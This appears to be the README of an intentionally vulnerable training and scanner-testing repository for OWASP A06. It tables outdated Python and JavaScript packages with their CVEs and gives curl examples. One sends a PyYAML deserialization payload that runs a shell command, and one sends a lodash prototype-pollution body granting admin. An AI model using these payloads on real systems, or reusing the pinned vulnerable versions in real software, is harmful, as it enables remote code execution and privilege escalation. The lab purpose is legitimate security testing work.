# OWASP A06:2025 - Vulnerable and Outdated Components

> **WARNING: This repository contains INTENTIONALLY VULNERABLE code for security scanner testing. DO NOT deploy to production.**

## Vulnerabilities Included

### Python Dependencies (Known CVEs)
| Package | Version | CVE | Severity | Description |
|---------|---------|-----|----------|-------------|
| Django | 2.2.0 | CVE-2019-14234 | Critical | SQL injection via key transforms |
| Pillow | 8.1.0 | CVE-2021-25287 | Critical | Heap buffer overflow in TIFF |
| PyYAML | 5.1 | CVE-2020-14343 | Critical | RCE via `yaml.load()` without Loader |
| Flask | 0.12.2 | CVE-2018-1000656 | High | DoS via large JSON payloads |
| Jinja2 | 2.10 | CVE-2019-10906 | High | Sandbox escape via string format |
| requests | 2.6.0 | CVE-2015-2296 | Medium | Session fixation |
| urllib3 | 1.24.1 | CVE-2019-11324 | High | Certificate verification bypass |
| cryptography | 3.2 | CVE-2020-25659 | High | Bleichenbacher timing oracle |
| celery | 4.4.0 | CVE-2021-23727 | Critical | Command injection via task names |
| lxml | 3.6.4 | CVE-2020-27783 | Medium | XSS in HTML cleaner |

### JavaScript Dependencies (Known CVEs)
| Package | Version | CVE | Severity | Description |
|---------|---------|-----|----------|-------------|
| lodash | 4.17.4 | CVE-2019-10744 | Critical | Prototype pollution via `_.merge` |
| jquery | 1.6.1 | CVE-2019-11358 | Medium | Prototype pollution |
| moment | 2.18.0 | CVE-2022-31129 | High | ReDoS via crafted date string |
| axios | 0.18.0 | CVE-2019-10742 | High | SSRF |
| serialize-javascript | 1.6.1 | CVE-2019-16769 | Critical | XSS/RCE |
| marked | 0.3.6 | CVE-2022-21680 | High | ReDoS + XSS |
| minimist | 1.2.0 | CVE-2020-7598 | Critical | Prototype pollution |
| handlebars | 4.0.11 | CVE-2019-20920 | High | Template injection |
| tar | 2.2.1 | CVE-2021-32803 | High | Path traversal |
| path-parse | 1.0.6 | CVE-2021-23343 | High | ReDoS |

### Container
- Base image `python:3.6-slim-buster` – EOL, hundreds of unpatched CVEs
- Running as `root` inside container

## Stack
Python 3 / Flask / Node.js / Docker

## Setup
```bash
pip install -r requirements.txt
npm install
python app.py        # Python server on :5006
node server.js       # Node server on :3000
```

## Attack Examples
```bash
# PyYAML RCE via yaml.load()
curl -X POST http://localhost:5006/api/import_config \
  -H "Content-Type: text/plain" \
  -d '!!python/object/apply:os.system ["id > /tmp/pwned"]'

# Lodash prototype pollution
curl -X POST http://localhost:3000/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"admin":true}}'

# Scan dependencies for CVEs
pip-audit -r requirements.txt
npm audit
```
